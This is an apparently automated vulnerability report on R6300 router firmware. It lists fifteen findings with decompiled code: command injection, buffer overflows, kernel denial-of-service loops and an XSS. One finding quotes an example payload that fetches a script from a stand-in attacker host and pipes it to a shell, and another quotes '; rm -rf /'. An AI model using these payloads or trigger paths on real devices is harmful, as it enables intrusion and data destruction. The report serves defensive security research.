# R6300 (15 findings)

---

### CommandInjection-bftpd-fcn.0000c224

- **File/Directory Path:** `usr/sbin/bftpd`
- **Location:** `bftpd:0xc338 in function fcn.0000c224`
- **Risk Score:** 9.0
- **Confidence:** 9.0
- **Description:** A command injection vulnerability exists in the bftpd FTP server where user-controlled input from FTP commands is passed directly to the execv function without proper sanitization or validation. This vulnerability allows an authenticated non-root user to execute arbitrary commands on the system by crafting malicious inputs in FTP commands that trigger the vulnerable code path. The attack chain involves: user input obtained in function fcn.0000d95c, propagated through fcn.0000d1e8 to fcn.0000c224, and executed via execv at address 0xc338. Trigger conditions include sending specific FTP commands that leverage this path, such as those involving command execution or script handling. The vulnerability lacks input validation, enabling attackers to inject and execute shell commands, potentially leading to privilege escalation or full system compromise. Technical details include the use of execv with parameters derived from user input, demonstrating a clear lack of boundary checks or filtering.
- **Code Snippet:**
  ```
  From decompilation of fcn.0000c224 at address 0xc338:
  sym.imp.execv(param_1, puVar7 + -0x10)
  Where param_1 and puVar7 + -0x10 are derived from user input without validation, allowing command injection if user-controlled data is passed.
  ```
- **Keywords:** fcn.0000d95c, fcn.0000d1e8, fcn.0000c224, execv
- **Notes:** This vulnerability was identified in a general command execution path and may affect various FTP commands, though the specific handler for SITE CHMOD was not directly linked. The attack chain is complete and verifiable within the analyzed functions. Further investigation could map exact FTP commands that trigger this path, but the exploitability is confirmed. Additional components like NVRAM or environment variables were not involved in this chain.

---
### Command Injection and Buffer Overflow-fcn.0001a2b4

- **File/Directory Path:** `sbin/acos_service`
- **Location:** `acos_service:0x0001a4d4 fcn.0001a2b4`
- **Risk Score:** 8.5
- **Confidence:** 9.0
- **Description:** Command injection and buffer overflow vulnerabilities exist in function fcn.0001a2b4. User-controlled command line parameters are formatted via sprintf into a fixed-size stack buffer (0x108 bytes) using the format 'ifconfig %s add %s/%s', and then executed via system. There is a lack of boundary checks and input filtering. Trigger condition: argc > 3 and specific NVRAM configuration (e.g., 'dhcp6c_readylogo' set to '1') is met. Constraint: Input is directly inserted into the command string. Potential attack: Attacker injects commands (e.g., '; rm -rf /') or causes a buffer overflow, leading to arbitrary code execution.
- **Code Snippet:**
  ```
  // Extracted from assembly code
  0x0001a4d4: bl sym.imp.sprintf // Using format string 'ifconfig %s add %s/%s'
  0x0001a4e8: bl sym.imp.system // Execute command, potential injection or overflow
  ```
- **Keywords:** Command line parameter: argv, NVRAM variable: dhcp6c_readylogo, dhcp6c_iana_only, ipv6_proto, System call: system, sprintf, Custom function symbol: fcn.0001a2b4, sym.imp.sprintf, sym.imp.system
- **Notes:** Attack chain is complete: Command line parameters are passed from the main function to fcn.0001a2b4, ultimately executed via system. Tainted data flow has been verified. It is recommended to check the calling mechanism on the actual device.

---
### Command Injection-fcn.0001a53c

- **File/Directory Path:** `sbin/acos_service`
- **Location:** `acos_service:0x0001a53c fcn.0001a53c and 0x0001a064 fcn.0001a064`
- **Risk Score:** 8.5
- **Confidence:** 9.0
- **Description:** A command injection vulnerability exists in function fcn.0001a53c. User-controlled command line arguments are used to construct a command string via sprintf (format: 'ifconfig %s del %s/%s'), which is then executed via system, lacking input validation. Trigger condition: argc > 1 and NVRAM configuration (e.g., 'ipv6_proto' matches 'autoconfig') is met. Constraint: No input filtering or escaping. Potential attack: An attacker injects malicious commands (e.g., '`wget http://attacker.com/shell.sh -O - | sh`'), leading to arbitrary code execution.
- **Code Snippet:**
  ```
  // Extracted from taint analysis
  0x0001a248: bl sym.imp.sprintf // Construct command string 'ifconfig %s del %s/%s'
  0x0001a250: bl sym.imp.system // Execute command, user input is injected
  ```
- **Keywords:** Command line argument: argv, NVRAM variables: ipv6_proto, autoconfig, pppoe, auto, dhcp, System calls: system, sprintf, Custom function symbols: fcn.0001a53c, fcn.0001a064, sym.imp.acosNvramConfig_match, sym.imp.sprintf, sym.imp.system
- **Notes:** Attack chain is complete: Command line arguments are executed via sprintf and system. Tainted data flow from input point to sink point has been traced. It is recommended to verify the controllability of NVRAM variables.

---
### Command-Injection-hotplug2-event-handler

- **File/Directory Path:** `sbin/hotplug2`
- **Location:** `sbin/hotplug2:0xa8d0 fcn.0000a8d0 (switch cases 0 and 1)`
- **Risk Score:** 8.5
- **Confidence:** 9.0
- **Description:** In the hotplug2 event handling mechanism, when processing hotplug events, untrusted input data (from param_2, containing device attributes or operations) is processed by the fcn.0000a73c function. This function only checks for multiple '%' characters but does not sanitize shell metacharacters (such as ;, &, |, `, $). This lack of sanitization allows authenticated non-root users to inject arbitrary commands through crafted event data. The vulnerability is triggered in switch cases 0 (system call) and 1 (execvp call) of fcn.0000a8d0. Attackers can exploit this vulnerability by influencing hotplug events (for example, inserting a USB device with malicious attributes), leading to commands being executed with elevated privileges (if hotplug2 runs as root). The attack chain is complete from the input source (param_2) to the sink (system()/execvp()), with no proper boundary checks or validation in between.
- **Code Snippet:**
  ```
  Relevant code snippet from fcn.0000a8d0:
    - Case 0 (system call):
      case 0:
          uVar5 = sym.imp.strdup(**(iVar12 + 4));  // Load untrusted string from param_2
          uVar9 = fcn.0000a73c(uVar5, param_1);    // Process string (no shell metacharacter sanitization)
          iVar11 = sym.imp.system(uVar9);          // Direct command execution - vulnerability point
          // ... other code
    - Case 1 (execvp call):
      case 1:
          piVar6 = *(iVar12 + 4);                  // Load untrusted string array from param_2
          iVar11 = *piVar6;
          uVar13 = sym.imp.fork();
          if (uVar13 != 0xffffffff) {
              piVar10 = piVar6;
              if (uVar13 == 0) {
                  while( true ) {
                      iVar8 = *piVar10;
                      if (iVar8 == 0) break;
                      iVar8 = fcn.0000a73c(iVar8, param_1);  // Process each string (no sanitization)
                      *piVar10 = iVar8;            // Overwrite with processed data
                      piVar10 = piVar10 + 1;
                  }
                  sym.imp.execvp(iVar11, piVar6);  // Execute command and arguments - vulnerability point
                  sym.imp.exit(iVar8);
              }
          }
          break;
    - Code in fcn.0000a73c shows lack of sanitization:
      while( true ) {
          iVar3 = sym.imp.strchr(param_1, 0x25);  // Check for '%'
          if (iVar3 + 0 == 0) break;
          param_1 = iVar3 + 0 + 1;
          iVar2 = sym.imp.strchr(param_1, 0x25);
          if (iVar2 != 0) {
              fcn.0000a30c((iVar2 - iVar3) + 2);  // Only handles multiple '%', no shell metacharacter checks
          }
      }
  ```
- **Keywords:** hotplug event data (via param_2), environment variables set via setenv in fcn.0000a8d0, fcn.0000a73c (string processing function), fcn.000091c0 (value retrieval function), /etc/hotplug2.rules (configuration file), netlink socket (IPC communication)
- **Notes:** This finding is based on the analysis of the hotplug2 binary in the sbin directory. The attack chain assumes param_2 is populated from user-influenced hotplug events (for example, via udev rules or device attributes). Further analysis could trace how param_2 is initialized from external inputs (such as kernel events or configuration files). The vulnerability can be exploited by authenticated non-root users by triggering or influencing hotplug events, potentially leading to privilege escalation. Related functions include fcn.00009930 (caller), fcn.0000a73c (string processor), and fcn.000091c0 (value retriever). It is recommended to validate the hotplug event data flow to confirm input sources.

---
### BufferOverflow-emf_netlink_sock_cb

- **File/Directory Path:** `lib/modules/2.6.36.4brcmarm+/kernel/drivers/net/emf/emf.ko`
- **Location:** `emf.ko:0x08002930 (sym.emf_netlink_sock_cb) -> emf.ko:0x080022d8 (reloc.emf_cfg_request_process) -> emf.ko:0x08002660 (sprintf call)`
- **Risk Score:** 8.5
- **Confidence:** 9.0
- **Description:** This function processes netlink messages. When the message length is >= 1056 bytes and the interface name validation fails, it calls `sprintf` without bounds checking, causing a stack buffer overflow. An attacker, as a non-root user but with valid login credentials, can trigger this vulnerability by sending a specially crafted message via the network interface (netlink socket). Full attack chain: Entry point (netlink socket) → Data flow (netlink message processing, via `sym.emf_netlink_sock_cb` and `reloc.emf_cfg_request_process`) → Missing validation (when `sym.emf_if_name_validate` returns 0, buffer boundaries are not checked) → Dangerous operation (`sprintf` call causes overflow). Trigger conditions include: message length at least 1056 bytes, invalid interface name. Exploitability analysis: An attacker could overwrite adjacent memory to achieve arbitrary code execution or denial of service.
- **Code Snippet:**
  ```
  In sym.emf_netlink_sock_cb:
  0x08002930: push {r4, r5, r6, lr}
  0x08002934: mov r1, 0xd0
  0x08002938: bl reloc.skb_clone
  0x0800293c: mov r5, r0
  0x08002940: ldr r3, [r0, 0x94]
  0x08002944: cmp r3, 0x420
  0x08002948: blo 0x800298c  ; Jump if length < 1056
  0x0800294c: ldr r4, [r0, 0xd8]  ; Load message data pointer
  0x08002950: add r0, r4, 0x10
  0x08002954: bl reloc.emf_cfg_request_process
  In the vulnerable path of emf_cfg_request_process:
  0x080022e8: bl sym.emf_if_name_validate
  0x080022ec: subs r5, r0, 0
  0x080022f0: beq 0x8002654  ; Branch if validation fails
  0x08002654: mov r3, 2
  0x08002658: add r0, r4, 0x20  ; Buffer at r4 + 0x20
  0x0800265c: str r3, [r4, 0x18]
  0x08002660: mov r2, r4  ; Tainted data as argument
  0x08002664: ldr r1, [0x080028f4]  ; Format string address
  0x08002668: bl sprintf  ; Dangerous call without bounds check
  ```
- **Keywords:** netlink_socket, sym.emf_netlink_sock_cb, reloc.emf_cfg_request_process, sym.emf_if_name_validate, sprintf
- **Notes:** This vulnerability assumes the netlink socket is accessible by non-root users (based on the attacker having valid login credentials). The format string at [0x080028f4] may not be user-controlled, but the buffer overflow is still exploitable. It is recommended to further verify the netlink socket permissions and specific impact, for example, by confirming code execution possibility through dynamic testing. Related files include netlink-related kernel code.

---
### Command Injection-burnboardid

- **File/Directory Path:** `sbin/acos_service`
- **Location:** `acos_service:0x00013fa0 fcn.000154d0`
- **Risk Score:** 8.5
- **Confidence:** 8.5
- **Description:** A command injection vulnerability exists in function fcn.000154d0 (burnboardid). User-controlled input (via environment variables or NVRAM variables) is used to construct system commands, lacking input validation and filtering. Attackers can inject malicious commands (such as '; malicious_command') to execute arbitrary code. Trigger condition: The attacker sets malicious environment variables or manipulates NVRAM values. Constraints: Input is directly inserted into the command string without bounds checking or escaping. Potential attack: An attacker, as an authenticated user, sets the input via the web interface or API, leading to remote code execution.
- **Code Snippet:**
  ```
  // Example extracted from decompiled code
  uVar13 = sym.imp.acosNvramConfig_get(uVar13, uVar17);
  sym.imp.sprintf(iVar18, *0x140e0, pcVar10, uVar13); // pcVar10 and uVar13 are user input
  sym.imp.system(iVar18); // Executes command, potentially injecting malicious code
  ```
- **Keywords:** Environment Variable: Variables obtained via getenv, NVRAM Variable: Configuration obtained via acosNvramConfig_get, IPC/Network Input: Possibly setting environment variables via HTTP requests, Custom Function Symbols: fcn.000154d0, acosNvramConfig_get, getenv, sprintf, system
- **Notes:** Evidence is based on multiple system call chains in the decompiled code. The attack chain is complete: from getenv or acosNvramConfig_get to system. It is recommended to verify the controllability of specific environment variable names and NVRAM variables.

---
### Untitled Finding

- **File/Directory Path:** `usr/sbin/nvram`
- **Location:** `nvram:0x00008808 fcn.00008808`
- **Risk Score:** 8.5
- **Confidence:** 8.0
- **Description:** In the 'nvram' program, when processing the 'version' command, the program retrieves variables (such as 'pmon_ver' and 'os_version') from NVRAM and uses strcat and memcpy to concatenate them into a fixed-size stack buffer (0x10000 bytes). Due to the lack of bounds checking, an attacker can cause a buffer overflow by setting these NVRAM variables to long strings (with a total length exceeding 0x10000 bytes). The overflow can overwrite the return address on the stack, allowing arbitrary code execution. Trigger condition: after an attacker, as a non-root user, sets malicious NVRAM variables, the 'nvram version' command is executed. Potential exploitation method: a carefully crafted string can overwrite the return address to jump to shellcode or existing code segments, potentially escalating privileges (if the nvram program runs with higher privileges).
- **Code Snippet:**
  ```
  // Key code snippet extracted from decompilation
  puVar16 = iVar17 + -0x10000 + -4; // Buffer pointer
  sym.imp.memset(puVar16, 0, 0x10000); // Initialize buffer
  // ...
  iVar1 = sym.imp.nvram_get(iVar8 + *0x8c14); // Get 'pmon_ver'
  if (iVar1 == 0) { iVar1 = iVar8 + *0x8c28; }
  sym.imp.strcat(puVar16, iVar1); // Potential overflow point
  // ...
  iVar1 = sym.imp.nvram_get(iVar8 + *0x8c20); // Get 'os_version'
  if (iVar1 == 0) { iVar1 = iVar8 + *0x8c28; }
  sym.imp.strcat(puVar16, iVar1); // Another potential overflow point
  ```
- **Keywords:** NVRAM:pmon_ver, NVRAM:os_version, file:/sbin/nvram
- **Notes:** The vulnerability requires the attacker to be able to set NVRAM variables and execute the nvram command. It is assumed that the nvram program may run with root privileges (common in firmware), but file permissions and the actual environment need further verification. It is recommended to check nvram's setuid bit and test the exploitation chain. Related functions: fcn.00008808 (main logic), nvram_get, strcat.

---
### Untitled Finding

- **File/Directory Path:** `usr/lib/libupnp.so`
- **Location:** `libupnp.so:0x00006a94 sym.upnp_tlv_convert (case 8)`
- **Risk Score:** 8.5
- **Confidence:** 7.5
- **Description:** An integer overflow vulnerability exists in the TLV data processing of UPnP library, specifically in base64 decoding. When handling a SOAP request with a very long base64 string (approaching 4GB in length), the `strlen` function returns a large value, and `iVar4 + 8` in `sym.upnp_tlv_convert` case 8 integer overflows, leading to a small buffer allocation (e.g., 7 bytes for `iVar4=0xFFFFFFFF`). Subsequently, `sym.upnp_base64_decode` writes the decoded data (which can be up to 3GB) into this small buffer, causing a heap buffer overflow. An attacker with network access and valid login credentials (non-root user) can craft a malicious SOAP request to trigger this overflow, potentially leading to remote code execution or privilege escalation if the UPnP service runs as root. The trigger condition is sending a SOAP request with an excessively long base64-encoded TLV field.
- **Code Snippet:**
  ```
  case 8:
      iVar4 = loc.imp.strlen(param_2);
      if (param_1[2] != 0) {
          loc.imp.free();
      }
      piVar1 = loc.imp.malloc(iVar4 + 8);
      bVar9 = piVar1 == NULL;
      piVar3 = piVar1;
      param_1[2] = piVar1;
      if (bVar9) {
          piVar1 = 0x25b;
      }
      if (!bVar9) {
          piVar1 = rsym.upnp_base64_decode(param_2,iVar4,piVar3);
          bVar9 = piVar1 + 0 < 0;
          bVar10 = piVar1 != NULL;
          param_1[1] = piVar1;
          if (!bVar10 || bVar9) {
              piVar1 = 0x258;
          }
          if (bVar10 && !bVar9) {
              piVar1 = NULL;
          }
          return piVar1;
      }
      return piVar1;
  ```
- **Keywords:** SOAP request data, TLV data in UPnP actions, base64-encoded input in SOAP body
- **Notes:** The vulnerability requires a large input (~4GB) to trigger the integer overflow, which may be impractical in some environments due to network constraints, but in local networks or with resourceful attackers, it could be feasible. The exploitability depends on the heap layout and mitigation techniques (e.g., ASLR). Further analysis is recommended to verify the exact impact and develop a working exploit. The functions `sym.soap_process` and `sym.action_process` are involved in the data flow from SOAP input to this point.

---
### BufferOverflow-SendEmail

- **File/Directory Path:** `usr/lib/libnat.so`
- **Location:** `libnat.so:0x0000e42c SendEmail (strcat call)`
- **Risk Score:** 8.0
- **Confidence:** 8.0
- **Description:** The SendEmail function contains a stack buffer overflow vulnerability when processing the SMTP server address (param_2). A fixed-size 1024-byte stack buffer is initialized with 'HELO ' (5 bytes), and strcat is used to append param_2 without length validation. If param_2 exceeds 1019 bytes, it overflows the buffer. The return address is located 1068 bytes from the buffer start, allowing arbitrary code execution by crafting a long param_2. Attackers with valid login credentials can exploit this by setting a malicious SMTP server address in device configuration (e.g., via web interface or NVRAM), triggering the overflow when SendEmail is called during email alert operations. The vulnerability is directly exploitable under the non-root user context, leading to potential full control of the process.
- **Code Snippet:**
  ```
  From decompilation:
  *puVar3 = **(puVar7 + -0x830);
  *(puVar7 + -0x820) = uVar6;
  loc.imp.strcat(puVar3,param_2);
  
  From disassembly:
  0x0000e428      0510a0e1       mov r1, r5  ; r5 is param_2
  0x0000e42c      0fd4ffeb       bl loc.imp.strcat
  ```
- **Keywords:** param_2 (SMTP server address), NVRAM variables for email configuration, acosFw_SetEmailConfig
- **Notes:** The input param_2 is assumed to be user-controllable via device configuration, but the data flow from untrusted sources (e.g., network interfaces or NVRAM) was not verified within this analysis due to scope restrictions. Further tracing of calls to SendEmail and configuration functions (e.g., acosFw_SetEmailConfig) is recommended to confirm the complete attack chain. This vulnerability is considered highly exploitable based on the code evidence.

---
### DoS-opendns_hijack_functions

- **File/Directory Path:** `lib/modules/2.6.36.4brcmarm+/kernel/lib/opendns.ko`
- **Location:** `opendns.ko:0x08000528 (sym.openDNS_Hijack_pre_input), opendns.ko:0x08000480 (sym.openDNS_Hijack_post_input)`
- **Risk Score:** 7.5
- **Confidence:** 9.0
- **Description:** The 'opendns.ko' kernel module contains a denial-of-service vulnerability in its network packet hook functions. Specifically, `openDNS_Hijack_pre_input` and `openDNS_Hijack_post_input` functions enter an infinite loop when processing IPv4 packets with a source or destination port of 53 (DNS). This occurs when the IP version field is 4 (IPv4) and the port field matches 0x35 (53 in decimal). The infinite loop causes the kernel to hang or crash, leading to a system-wide DoS. A non-root user with network access can exploit this by sending crafted IPv4 DNS packets to the device, triggering the loop without any authentication or special privileges. The vulnerability is directly exploitable and requires no additional steps beyond sending the malicious packets.
- **Code Snippet:**
  ```
  // From sym.openDNS_Hijack_pre_input
  if ((*param_3 >> 4 == 4) && (CONCAT11(param_3[0x16],param_3[0x17]) == 0x35)) {
      do {
          // Infinite loop
      } while( true );
  }
  
  // From sym.openDNS_Hijack_post_input
  if ((*param_3 >> 4 == 4) && (CONCAT11(param_3[0x14],param_3[0x15]) == 0x35)) {
      do {
          // Infinite loop
      } while( true );
  }
  ```
- **Keywords:** sym.openDNS_Hijack_pre_input, sym.openDNS_Hijack_post_input, network interface
- **Notes:** The vulnerability is straightforward and exploitable by any user with network access. No privilege escalation is involved, but the DoS impact is severe. Further analysis could involve testing the module in a live environment to confirm the trigger conditions. The module initialization also has an infinite loop, but it is likely a development error and not directly exploitable at runtime.

---
### Buffer Overflow-burnethermac

- **File/Directory Path:** `sbin/acos_service`
- **Location:** `acos_service:0x15c44 fcn.00015c44`
- **Risk Score:** 7.5
- **Confidence:** 8.0
- **Description:** A buffer overflow vulnerability exists in function fcn.00015c44 (burnethermac). User-controlled environment variables (such as IFNAME, IDLE_TIMEOUT) are concatenated via strcat onto stack buffers (such as auStack_b0, 80 bytes), lacking bounds checking. An attacker can provide overly long values to overwrite stack data, including the return address, leading to arbitrary code execution. Trigger condition: The function is called with excessively long environment variable values. Constraint: Fixed buffer size, no length validation. Potential attack: An attacker sets malicious environment variables, overflows the buffer, and controls execution flow.
- **Code Snippet:**
  ```
  // Example code showing strcat usage
  puVar6 = puVar9 + -0x44; // Stack buffer
  sym.imp.strcat(puVar6, iVar8); // iVar8 from getenv, no bounds check
  sym.imp.unlink(puVar6); // Possible path traversal if buffer overflowed
  ```
- **Keywords:** Environment Variables: IFNAME, IDLE_TIMEOUT, NVRAM Variables: acosNvramConfig_set, acosNvramConfig_match, File Operations: unlink, fopen, Custom Function Symbols: fcn.00015c44, strcat, getenv
- **Notes:** Vulnerability based on multiple strcat operations in the decompiled code. Attack chain is complete: environment variable input to buffer overflow. Requires further tracing of function call context to confirm non-root user accessibility.

---
### stack-buffer-overflow-vol_id

- **File/Directory Path:** `lib/udev/vol_id`
- **Location:** `vol_id:0x9654 sym.imp.sprintf`
- **Risk Score:** 7.5
- **Confidence:** 8.0
- **Description:** A stack buffer overflow vulnerability was discovered in the 'vol_id' program. The vulnerability is located in the code path handling the volume label export function. When the program runs in '--export' mode, it uses `sprintf` to write a user-controlled volume label into a fixed-size stack buffer. An attacker can trigger the overflow by creating a specially crafted device file (such as a USB storage device) and setting a malicious volume label. Specific trigger conditions: 1) The program runs in '--export' mode; 2) The device file path contains the 'sd' string (indicating a USB device); 3) The volume label length exceeds the target buffer size (348 bytes). Exploitation method: An attacker, as a logged-in non-root user, can create a specially crafted device file or mount a malicious storage device, then run 'vol_id --export /dev/sdX' to trigger the overflow, potentially executing arbitrary code or causing a denial of service.
- **Code Snippet:**
  ```
  0x0000964c      80119fe5       ldr r1, str._tmp_usb_vol_name__s ; [0xa4ea:4]=0x706d742f ; "/tmp/usb_vol_name/%s"
  0x00009650      0500a0e1       mov r0, r5                  ; char *s
  0x00009654      22feffeb       bl sym.imp.sprintf          ; int sprintf(char *s, const char *format, ...)
  ```
- **Keywords:** ID_FS_LABEL, /tmp/usb_vol_name/%s
- **Notes:** Vulnerability verified: 1) The target buffer is on the stack with a fixed size (348 bytes); 2) The volume label is fully user-controlled, provided via the device file; 3) No bounds checking, directly uses `sprintf`. Attack chain is complete: A non-root user can create a specially crafted device file → run vol_id → trigger overflow. It is recommended to further verify the feasibility of actual exploitation, such as checking the stack layout and the possibility of overwriting the return address.

---
### buffer-overflow-igs_cfg_request_process

- **File/Directory Path:** `lib/modules/2.6.36.4brcmarm+/kernel/drivers/net/igs/igs.ko`
- **Location:** `igs.ko:0x08001f20 sym.igs_cfg_request_process (multiple addresses: 0x08002010, 0x08002040, 0x08002060, etc.)`
- **Risk Score:** 7.5
- **Confidence:** 7.0
- **Description:** A buffer overflow vulnerability exists in the 'sym.igs_cfg_request_process' function of the 'igs.ko' kernel module. The vulnerability occurs in error handling paths where 'sprintf' is used to format user-controlled input into a buffer without bounds checks. Specifically, 'sprintf' is called with the destination buffer at offset 0x20 from the input pointer (r4), and the format string contains '%s' or similar specifiers, allowing attacker-controlled data from the input buffer to be written. The input is received via Netlink socket callback ('sym.igs_netlink_sock_cb'), and the error paths are triggered when conditions like invalid instance identifiers or command IDs are encountered. An attacker with access to the Netlink socket (e.g., a logged-in user) can craft a message with a long string in relevant fields (e.g., instance identifier), causing 'sprintf' to write beyond the allocated buffer size. This could corrupt adjacent kernel memory, leading to denial of service or potential code execution. The vulnerability is exploitable when the error path is triggered, and the input buffer is sufficiently large (at least 1056 bytes as checked in 'sym.igs_netlink_sock_cb').
- **Code Snippet:**
  ```
  Example code from disassembly:
  0x08002010: ldr r1, [0x080020dc]  // Load format string (e.g., with %s)
  0x08002014: bl sprintf             // sprintf(r4+0x20, format, r4)
  Where r4 is the user-controlled input buffer.
  ```
- **Keywords:** Netlink socket for IGS family, igs_netlink_sock_cb, igs_cfg_request_process
- **Notes:** The vulnerability is in error paths, which may be less frequently executed, but are reachable via Netlink messages. The exact format strings and buffer sizes are not fully verified from the binary, but the use of 'sprintf' with user input is evident. Further analysis could involve dynamic testing or examining the kernel module's interaction with other components. Additional functions like 'sym.igsc_cfg_request_process' should be checked for similar issues.

---
### DoS-sym.ubd_netlink_sock_cb

- **File/Directory Path:** `lib/modules/2.6.36.4brcmarm+/kernel/lib/ubd.ko`
- **Location:** `ubd.ko:0x08000994 sym.ubd_netlink_sock_cb`
- **Risk Score:** 7.0
- **Confidence:** 8.0
- **Description:** In the function sym.ubd_netlink_sock_cb, there is a lack of sufficient validation of the Netlink message length. Specific issue: The function accesses the value at offset 0x94 of the parameter param_1 (a pointer to the Netlink message structure). If this value is greater than 1055 (0x41f), it enters an infinite loop, causing the kernel thread to hang and a system denial of service. Trigger condition: An attacker crafts a Netlink message where the field value at offset 0x94 of the message structure exceeds 1055. Constraints: The attacker must be able to send Netlink messages to this callback function; non-root users might require CAP_NET_ADMIN privileges, but the module might relax this restriction. Potential attack method: An attacker, as a logged-in user, writes a malicious userspace program that sends crafted messages via a Netlink socket, exhausting system resources. The probability of exploitation is high because the code directly compares the length and enters the loop, lacking error recovery.
- **Code Snippet:**
  ```
  void sym.ubd_netlink_sock_cb(int32_t param_1) {
      // ... Code simplified ...
      if (0x41f < *(param_1 + 0x94)) {
          do {
              // Infinite loop
          } while( true );
      }
      return;
  }
  ```
- **Keywords:** Netlink socket, Function sym.ubd_netlink_sock_cb
- **Notes:** The decompiled code has warnings, but the logic is clear; it is necessary to verify the permission settings when the Netlink socket is created (e.g., whether non-root user access is allowed). Related function: hasExclusiveAccess (synchronization mechanism). It is recommended to subsequently analyze the module initialization (sym.ubd_module_init) to confirm Netlink socket binding and permissions.

---
### XSS-displayItems-jquery-flexbox

- **File/Directory Path:** `www/script/jquery.flexbox.min.js`
- **Location:** `jquery.flexbox.min.js:displayItems function (approximately lines 400-450)`
- **Risk Score:** 5.0
- **Confidence:** 8.0
- **Description:** In jquery.flexbox.min.js, the displayItems function uses the .html() method to directly insert unescaped HTML content, leading to potential Cross-Site Scripting (XSS) attacks. Specific issues include: 1) The result string generated by o.resultTemplate.applyTemplate(data) may contain malicious HTML or scripts; 2) During the highlightMatches process, user input q is used for regular expression replacement, but the final content is rendered via .html(), lacking output encoding; 3) If the data source (such as a remote API or client-side object) returns untrusted data, an attacker can inject malicious code to be executed in the user's browser. Trigger conditions include: the data source being compromised, o.resultTemplate containing unfiltered HTML, or when o.highlightMatches is true and user input contains special characters. Potential attack methods: An attacker, as an authenticated user, can inject scripts by modifying requests or responses to achieve session hijacking or malicious operations. Constraints: The vulnerability depends on the controllability of the data source and may be limited by the security of internal APIs in the firmware context.
- **Code Snippet:**
  ```
  for (var i = 0; i < d[o.resultsProperty].length; i++) {
      var data = d[o.resultsProperty][i],
      result = o.resultTemplate.applyTemplate(data),
      exactMatch = q === result,
      selectedMatch = false,
      hasHtmlTags = false,
      match = data[o.displayValue];
      if (!exactMatch && o.highlightMatches && q !== '') {
          var pattern = q,
          highlightStart = match.toLowerCase().indexOf(q.toLowerCase()),
          replaceString = '<span class="' + o.matchClass + '">' + match.substr(highlightStart,q.length) + '</span>';
          if (result.match('<(.|\n)*?>')) {
              hasHtmlTags = true;
              pattern = '(>)([^<]*?)(' + q + ')((.|\n)*?)(<)';
              replaceString = '$1$2<span class="' + o.matchClass + '">$3</span>$4$6';
          }
          result = result.replace(new RegExp(pattern, o.highlightMatchesRegExModifier), replaceString);
      }
      $row = $('<div></div>')
          .attr('id', data[o.hiddenValue])
          .attr('val', data[o.displayValue])
          .addClass('row')
          .html(result)
          .appendTo($content);
  }
  ```
- **Keywords:** o.source, data[o.displayValue], o.resultTemplate, q, o.highlightMatches
- **Notes:** There is clear code evidence of the vulnerability, but the complete attack chain requires control of the data source (such as o.source or data objects), which might be difficult to verify in the firmware context. Subsequent analysis is recommended to check the HTML pages using this plugin and the data source APIs. Other functions like displayItems2 have similar issues. No vulnerabilities related to NVRAM, IPC, or system-level interactions were found.

---
